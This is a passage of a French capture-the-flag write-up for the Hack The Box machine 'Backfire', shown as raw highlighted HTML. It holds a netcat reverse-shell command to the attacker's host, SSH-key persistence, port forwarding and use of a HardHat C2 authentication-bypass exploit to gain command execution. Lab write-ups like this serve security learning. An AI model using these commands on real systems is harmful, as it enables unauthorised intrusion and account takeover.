&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">socket&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">teamserver&lt;/span>&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Success&lt;/span>&lt;span class="p">!&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">write&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Success&lt;/span>&lt;span class="p">!&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">poll&lt;/span> &lt;span class="nx">teamserver&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">socket&lt;/span> &lt;span class="nx">output&lt;/span>&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Read&lt;/span> &lt;span class="nx">socket&lt;/span> &lt;span class="nx">output&lt;/span> &lt;span class="nx">successfully&lt;/span>&lt;span class="p">!&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">Enter&lt;/span> &lt;span class="nx">command&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">execute&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">busybox&lt;/span> &lt;span class="nx">nc&lt;/span> &lt;span class="mf">10.10.14.173&lt;/span> &lt;span class="mi">80&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">e&lt;/span> &lt;span class="nx">sh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">write&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Success&lt;/span>&lt;span class="p">!&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">poll&lt;/span> &lt;span class="nx">teamserver&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">socket&lt;/span> &lt;span class="nx">output&lt;/span>&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Read&lt;/span> &lt;span class="nx">socket&lt;/span> &lt;span class="nx">output&lt;/span> &lt;span class="nx">successfully&lt;/span>&lt;span class="p">!&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;p>Le reverse shell obtenu n&amp;rsquo;étant pas stable et se coupant rapidement, on ajoute notre clé ssh dans le fichier de clés autorisées du compte d&amp;rsquo;&lt;code>Ilya&lt;/code>.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="hl">&lt;span class="lnt">4
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">5
&lt;/span>&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">nc&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">lvnp&lt;/span> &lt;span class="mi">80&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">listening&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="kt">any&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="mi">80&lt;/span> &lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">connect&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mf">10.10.14.173&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nf">from&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">UNKNOWN&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mf">10.10.11.49&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="mi">60884&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">echo&lt;/span> &lt;span class="s">&amp;#34;ssh-ed25519 A...k kali@kali&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">ilya&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ssh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">authorized_keys&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">cat&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">ilya&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ssh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">authorized_keys&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ssh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ed25519&lt;/span> &lt;span class="nx">A&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="nx">k&lt;/span> &lt;span class="nx">kali&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">kali&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;p>On se connecte via SSH et on récupère le flag user.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="hl">&lt;span class="lnt">3
&lt;/span>&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="hl">&lt;span class="lnt">5
&lt;/span>&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="p">~&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ssh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">id_ed25519&lt;/span> &lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">10.10.11.49&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">files&lt;/span> &lt;span class="nx">hardhat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="nx">Havoc&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">b961&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="mo">016&lt;/span>&lt;span class="nx">b&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;h2 id="lateral-mouvement-sergej">Lateral mouvement: Sergej
&lt;/h2>&lt;h3 id="exploit-hardhat-c2-authentification-bypass--rce">Exploit HardHat C2: Authentification bypass + RCE
&lt;/h3>&lt;p>Dans le home d&amp;rsquo;&lt;code>Ilya&lt;/code>, on remarque le fichier &lt;code>hardhat.txt&lt;/code> suivant:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="hl">&lt;span class="lnt">3
&lt;/span>&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">files&lt;/span> &lt;span class="nx">hardhat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="nx">Havoc&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">hardhat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Sergej&lt;/span> &lt;span class="nx">said&lt;/span> &lt;span class="nx">he&lt;/span> &lt;span class="nx">installed&lt;/span> &lt;span class="nx">HardHatC2&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">testing&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">not&lt;/span> &lt;span class="nx">made&lt;/span> &lt;span class="kt">any&lt;/span> &lt;span class="nx">changes&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">defaults&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">I&lt;/span> &lt;span class="nx">hope&lt;/span> &lt;span class="nx">he&lt;/span> &lt;span class="nx">prefers&lt;/span> &lt;span class="nx">Havoc&lt;/span> &lt;span class="nx">bcoz&lt;/span> &lt;span class="nx">I&lt;/span> &lt;span class="nx">don&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">t&lt;/span> &lt;span class="nx">wanna&lt;/span> &lt;span class="nx">learn&lt;/span> &lt;span class="nx">another&lt;/span> &lt;span class="nx">C2&lt;/span> &lt;span class="nx">framework&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">also&lt;/span> &lt;span class="nx">Go&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nx">C&lt;/span>&lt;span class="err">#&lt;/span> &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>En observant les ports en écoute, on a bien la confirmation qu&amp;rsquo;une instance de &lt;code>HardHat&lt;/code>, un autre C2, est présent sur le serveur:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 4
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 5
&lt;/span>&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">netstat&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">planetu&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">..&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Proto&lt;/span> &lt;span class="nx">Recv&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Q&lt;/span> &lt;span class="nx">Send&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Q&lt;/span> &lt;span class="nx">Local&lt;/span> &lt;span class="nx">Address&lt;/span> &lt;span class="nx">Foreign&lt;/span> &lt;span class="nx">Address&lt;/span> &lt;span class="nx">State&lt;/span> &lt;span class="nx">User&lt;/span> &lt;span class="nx">Inode&lt;/span> &lt;span class="nx">PID&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Program&lt;/span> &lt;span class="nx">name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">5000&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">1001&lt;/span> &lt;span class="mi">50679&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">7096&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">1001&lt;/span> &lt;span class="mi">51911&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">40056&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">1000&lt;/span> &lt;span class="mi">54307&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">443&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">21679&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">22&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">22673&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8000&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">21680&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8443&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">1000&lt;/span> &lt;span class="mi">53569&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">]&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>Puisque &lt;code>Sergej&lt;/code> n&amp;rsquo;a apporté aucun changement à la configuration par défaut du C2, nous allons nous baser sur l&amp;rsquo;article suivant afin de compromettre son compte:
&lt;a class="link" href="https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7" target="_blank" rel="noopener"
>https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7&lt;/a>&lt;/p>
&lt;p>Plus précisément, on s&amp;rsquo;intéresse aux vulnérabilités 2 et 3.&lt;/p>
&lt;p>La première vulnérabilité permettant de contourner l&amp;rsquo;authentification exploite le fait que HardHat utilise une clé statique pour signer les JWTs, ce qui nous permet de créer des jetons d&amp;rsquo;authentification pour n&amp;rsquo;importe quel rôle.&lt;/p>
&lt;p>On forward alors le port 5000 afin d&amp;rsquo;utiliser le script fourni dans l&amp;rsquo;article et créer un nouvel utilisateur ayant le rôle de &lt;code>TeamLead&lt;/code>.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ssh&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">L&lt;/span> &lt;span class="mi">5000&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">5000&lt;/span> &lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">10.10.11.49&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;p>Dans le script récupéré, on modifie le paramètre &lt;code>rhost&lt;/code> pour &lt;code>rhost: = 'localhost:5000'&lt;/code> et on crée notre nouvel utilisateur.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="hl">&lt;span class="lnt">6
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">python3&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">exploit&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Generated&lt;/span> &lt;span class="nx">JWT&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ey&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="nx">oH6CDUNc&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">User&lt;/span> &lt;span class="nx">sth_pentest&lt;/span> &lt;span class="nx">created&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;p>Maintenant que notre utilisateur est crée, nous allons exploiter la seconde vulnérabilité afin d&amp;rsquo;obtenir de l&amp;rsquo;éxecution de code via l&amp;rsquo;interface de HardHat accessible sur le port 7096.&lt;/p>
&lt;p>Dans un premier temps, on forward ce port et se connecte avec notre utilisateur &lt;code>stj_pentest&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">L&lt;/span> &lt;span class="mi">7096&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">7096&lt;/span> &lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">10.10.11.49&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>Ensuite, on va accéder à la page &lt;code>ImplantInteract&lt;/code> afin d&amp;rsquo;utiliser la console intégrée.&lt;/p>
&lt;p>On constate bien que les commandes sont exécutées en tant que &lt;code>Sergej&lt;/code>, on va ajouter notre clé publique dans les clés autorisées de ce compte afin de pouvoir nous y connecter via SSH.&lt;/p>
&lt;p>&lt;img src="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/HardHat-Console1.png"
width="972"
height="752"
srcset="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/HardHat-Console1_hu_e2d8a9fb05755c10.png 480w, https://01MI.github.io/p/backfire-htb-writeup-linux-medium/HardHat-Console1_hu_9ef9514df24c6ed0.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="129"
data-flex-basis="310px"
>&lt;/p>
&lt;p>&lt;img src="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/HardHat-Console2.png"
width="961"
height="119"
srcset="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/HardHat-Console2_hu_f16c283fb5549909.png 480w, https://01MI.github.io/p/backfire-htb-writeup-linux-medium/HardHat-Console2_hu_61a1feae2d5c74e2.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="807"
data-flex-basis="1938px"
>&lt;/p>
&lt;h2 id="root">Root
&lt;/h2>&lt;h3 id="défaut-de-configuration-lié-à-sudo">Défaut de configuration lié à sudo
&lt;/h3>&lt;p>Une fois connecté en SSH, on remarque un défaut de configuration lié à sudo.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 3
&lt;/span>&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 5
&lt;/span>&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="hl">&lt;span class="lnt">17
&lt;/span>&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="hl">&lt;span class="lnt">22
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">23
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="p">~&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ssh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">id_ed25519&lt;/span> &lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">10.10.11.49&lt;/span>
